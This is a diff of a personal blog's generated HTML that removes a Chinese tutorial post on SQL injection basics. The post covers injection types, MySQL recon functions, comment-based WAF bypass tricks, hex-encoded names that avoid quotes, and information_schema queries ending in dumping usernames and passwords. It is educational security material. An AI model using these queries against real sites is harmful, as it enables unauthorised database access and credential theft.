-      <meta itemprop="name" content="CSQ">
-      <meta itemprop="description" content="学无止境">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CSQ&个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/05/03/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">SQL注入基础</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-05-03 14:06:32 / 修改时间：14:38:58" itemprop="dateCreated datePublished" datetime="2023-05-03T14:06:32+08:00">2023-05-03</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h2><h4 id="SQL注入的产生"><a href="#SQL注入的产生" class="headerlink" title="SQL注入的产生"></a>SQL注入的产生</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</span><br></pre></td></tr></table></figure>
-
-<h4 id="SQL注入的原理"><a href="#SQL注入的原理" class="headerlink" title="SQL注入的原理"></a>SQL注入的原理</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</span><br><span class="line">根据相关技术原理，SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。基于此，SQL注入的产生原因通常表现在以下几方面：1、不当的类型处理；2、不安全的数据库配置；3、不合理的查询集处理；4、不当的错误处理；5、转义字符处理不合适；6、多个提交处理不当。</span><br></pre></td></tr></table></figure>
-
-<h4 id="SQL注入类型"><a href="#SQL注入类型" class="headerlink" title="SQL注入类型"></a>SQL注入类型</h4><p>UNION query SQL injection     (可联合查询注入)</p>
-<p>Error-based SQL injection        (报错型注入)</p>
-<p>Boolean-based blind SQL injection  (布尔型注入)</p>
-<p>Time-based blind SQL injection  (基于时间延迟注入)</p>
-<p>Wide char SQL injection  (宽字节注入)</p>
-<p>Twice SQL injection  (二次注入)</p>
-<p>Stacked queries SQL injection  (可多语句查询注入) 堆叠注入</p>
-<p>Access数据库 &#x3D;&gt;偏移注入</p>
-<p>DNSlog  外带注入</p>
-<h4 id="mysql函数利用"><a href="#mysql函数利用" class="headerlink" title="mysql函数利用"></a>mysql函数利用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-- select database()            查看当前数据库的名称</span><br><span class="line">-- select @@basedir             mysql安装路径</span><br><span class="line">-- select @@datadir             mysql数据存储路径</span><br><span class="line">-- select @@version_compile_os  查看操作系统</span><br><span class="line"></span><br><span class="line">-- select user()</span><br><span class="line">-- select system_user()</span><br><span class="line">-- select session_user()</span><br><span class="line">-- select current_user  查看当前连接的用户名</span><br><span class="line"></span><br><span class="line">-- select version() </span><br><span class="line">-- select @@version 查看当前版本</span><br></pre></td></tr></table></figure>
-
-<h4 id="注释风格"><a href="#注释风格" class="headerlink" title="注释风格"></a>注释风格</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#     (url编码为%23)</span><br><span class="line">--  或者--+  (--后边要跟上一个或多个空格)(+号在浏览器会被解析成空格)</span><br><span class="line">/*....*/  内联注释</span><br><span class="line"></span><br><span class="line">/*!*/ 这个没有任何意义，只是干扰，select</span><br><span class="line">/*!@@version*/</span><br><span class="line"></span><br><span class="line">select*/*!22222from*/ users;</span><br><span class="line">如果数字(5位) 大于当前mysql版本号 注释生效否则不生效 (绕过waf)</span><br></pre></td></tr></table></figure>
-
-<h4 id="数据库-information-schema"><a href="#数据库-information-schema" class="headerlink" title="数据库:information_schema"></a>数据库:information_schema</h4><p>(存储所有数据库&#x2F;表&#x2F;字段的名称信息)</p>
-<p>SCHEMATA表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字段：SCHEMA_NAME （存储所有数据库的名称）</span><br></pre></td></tr></table></figure>
-
-<p>TABLES表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字段：TABLE_SCHEMA,TABLE_NAME（存储所有表的名称）</span><br></pre></td></tr></table></figure>
-
-<p>COLUMNS表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字段：TBALE_SCHEMA,TABLE_NAME,COLUMN_NAME（存储所有的字段名）</span><br></pre></td></tr></table></figure>
-
-<h4 id="获取数据库名称"><a href="#获取数据库名称" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h4><p> limit 一个一个打印出来库名<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1</span><br></pre></td></tr></table></figure></p>
-<p> group_concat 一次性全部显示</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</span><br></pre></td></tr></table></figure>
-
-<h4 id="列出-数据库：test-中所有的表"><a href="#列出-数据库：test-中所有的表" class="headerlink" title="列出(数据库：test)中所有的表"></a>列出(数据库：test)中所有的表</h4><p> limit 一个一个打印出来字段名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;test&#x27; limit 0,1</span><br></pre></td></tr></table></figure>
-
-<p> group_concat 一次性全部显示</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=0x674657374</span><br></pre></td></tr></table></figure>
-
-<p>注意:数据库名称可以用十六进制来代替字符串，这样可以绕过单引号的限制。</p>
-<h4 id="列出（数据库：test-表：admin-）中所有的字段"><a href="#列出（数据库：test-表：admin-）中所有的字段" class="headerlink" title="列出（数据库：test 表：admin ）中所有的字段"></a>列出（数据库：test 表：admin ）中所有的字段</h4><p> limit 一个一个打印出来<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=&#x27;test&#x27; and TABLE_NAME=&#x27;t10&#x27; limit 0,1</span><br></pre></td></tr></table></figure></p>
-<p> group_concat 一次性全部显示</p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=0x74657374 and TABLE_NAME=0x61646d696e</span><br></pre></td></tr></table></figure>
-
-<h4 id="列出（数据库：test-表：admin-）中的数据"><a href="#列出（数据库：test-表：admin-）中的数据" class="headerlink" title="列出（数据库：test 表：admin ）中的数据"></a>列出（数据库：test 表：admin ）中的数据</h4><p>limit 一个一个打印出来<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,passwd from test.admin limit 0,1</span><br></pre></td></tr></table></figure></p>
-<p>group_concat 把 一次性全部打印</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(concat(username,0x3D,password)) from security.users</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
-  
-
 
 
           </div>
@@ -525,7 +258,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-count">5</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
